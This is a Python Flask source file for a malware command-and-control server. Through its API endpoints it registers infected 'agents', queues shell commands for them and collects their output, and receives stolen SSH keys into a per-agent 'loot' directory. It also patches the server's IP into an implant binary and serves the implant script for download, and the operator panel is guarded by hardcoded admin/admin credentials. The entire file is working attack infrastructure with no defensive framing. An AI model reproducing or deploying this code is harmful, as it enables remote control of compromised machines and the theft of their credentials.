from flask import Flask, render_template, redirect, url_for, request, session, flash, abort, send_from_directory
from flask_sqlalchemy import SQLAlchemy
from functools import wraps

import requests
from config import BaseConfig
import time
import os
import json

from models import *

# TODO
"""
- Make fronted look clean

"""


def login_required(f):
    @wraps(f)
    def wrap(*args, **kwargs):
        if 'logged_in' in session:
            return f(*args, **kwargs)
        else:
            flash('You need to login first.')
            return redirect(url_for('login'))

    return wrap


def build_implant():
    config = {}
    config['ip'] = requests.get("https://api.ipify.org").text
    config = json.dumps(config).encode("utf-8")

    with open('implant/payloads/implant', 'rb') as binFile:
        byteData = bytearray(binFile.read())
    offset = byteData.find(b'{"ip"')

    with open('implant/payloads/implant', 'r+b') as binFile:
        binFile.seek(offset)
        binFile.write(config)


def add_agent(agent_dict):
   # if not db.session.query(db.exists().where(Agent.ip == agent_dict['IP'])).scalar():
        args = [str(agent_dict['Stats'][key]) for key in agent_dict['Stats']]
        args += [str(agent_dict['total'])]
        args += [agent_dict['IP']]
        agent = Agent(*args)
        db.session.add(agent)
        db.session.flush()
        agent_id = agent.id
        print(agent_id)
        # db.session.add(CommandQueue(agent_id, 'ls', 'asd'))
        db.session.commit()
        print(agent_id)
        os.mkdir(f"loot/agent_{agent_id}")
        return agent.id


@app.route('/bots', methods=['GET'])
@login_required
def bots():
   return render_template("bots.html") 


@app.route('/bot<id>', methods=['GET'])
@login_required
def bot(id):
    agent = Agent.query.filter_by(id=id).first()
    print(agent)
    return render_template("bot.html", agent=agent)


@app.route('/', methods=['GET', 'POST'])
@login_required
def home():  # put application's code here
    output = ""
    if request.method == "POST":
        command = request.form['command']
        implantID = request.form['id']
        db.session.add(Commands(implantID=implantID, command=command))
        db.session.flush()
        db.session.commit()
        res = Commands.query.filter_by(implantID=implantID).first()
        res.command = command
        db.session.commit()
        time.sleep(1)
        res = Commands.query.filter_by(implantID=implantID).first()
        output = res.output

    agents = db.session.query(Agent).all()
    return render_template('index.html', agents=agents, command_out=output)


@app.route('/api/1.1/add_agent', methods=['POST'])
def agent_add():
    print(request.method)
    if request.method == 'POST':
        agent_dict = request.json
        id = add_agent(agent_dict)
        return str(id)


@app.route('/api/1.1/get_command', methods=['POST'])
def get_command():
    print(request.method)
    if request.method == 'POST':
        agent_id = request.json['id']
        res = Commands.query.filter(Commands.implantID==agent_id, Commands.retrieved==False).first()
        if res == None:
            return "None"
        res.retrieved = True
        return res.command + "," + str(res.commandID)


@app.route('/api/1.1/command_out', methods=['POST'])
def command_out():
    print(request.method)
    if request.method == 'POST':
        output = request.json['output']
        implantID = request.json['implantID']
        commandID = request.json['commandID']
        # print(output, agent_id)
        agent = Commands.query.filter_by(implantID=implantID).first()
        agent.output = output
        agent.command = 'None'
        # print(agent.output)
        db.session.commit()
        return 'Received'


@app.route('/api/1.1/ssh_keys', methods=['POST'])
def ssh_keys():
    if request.method == 'POST':
        key_dict = request.json['keys']
        agent_id = request.json['id']
        with open(f"loot/agent_{agent_id}/ssh_keys.txt", 'a+') as file:
            for key in key_dict:
                file.write(f"{key}: {key_dict[key]}\n")
        return 'Received BINGUS MODE'


@app.route('/api/1.1/retrieve_scripts', methods=['GET'])
def scripts():
    try:
        return send_from_directory('implant', path='implant.py', filename='implant.py', as_attachment=True)
    except FileNotFoundError:
        abort(404)


@app.route('/welcome', methods=['GET'])
def welcome():
    return render_template("welcome.html")


@app.route('/login', methods=['GET', 'POST'])
def login():
    error = None
    if request.method == 'POST':
        if request.form['username'] != 'admin' or request.form['password'] != 'admin':
            error = "Invalid credentials. Please try again."
        else:
            session['logged_in'] = True
            flash('You were just logged in!')
            return redirect(url_for('home'))
    return render_template('login.html', error=error)


@app.route('/logout', methods=['GET'])
@login_required
def logout():
    session.pop('logged_in', None)
    flash('You were just logged out!')
    return redirect(url_for('welcome'))


if __name__ == '__main__':
    build_implant()
    app.run(host="0.0.0.0")
